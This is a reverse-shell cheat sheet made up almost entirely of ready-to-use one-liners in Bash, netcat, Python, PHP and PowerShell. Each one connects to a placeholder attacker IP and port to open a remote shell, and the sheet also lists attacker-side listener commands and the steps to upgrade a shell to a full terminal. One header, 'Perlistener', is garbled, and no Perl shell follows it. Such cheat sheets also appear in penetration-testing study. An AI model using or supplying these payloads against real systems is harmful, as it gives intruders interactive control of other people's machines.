# Reverse Shells Cheat Sheet

## Bash Reverse Shell
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

## Netcat Reverse Shell
```bash
nc -e /bin/sh ATTACKER_IP PORT          # Linux
nc -e cmd.exe ATTACKER_IP PORT          # Windows
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f   # NC mkfifo
```

## Python Reverse Shell
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

## PHP Reverse Shell
```php
php -r '$s=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## PowerShell Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Perlistener (Attacker Side)
```bash
nc -lvnp PORT                           # Netcat listener
rlwrap nc -lvnp PORT                    # Netcat + readline
ncat -lvnp PORT                         # Nmap ncat
```

## Upgrading to PTY (Linux)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z  # background shell
stty raw -echo; fg
export TERM=xterm
```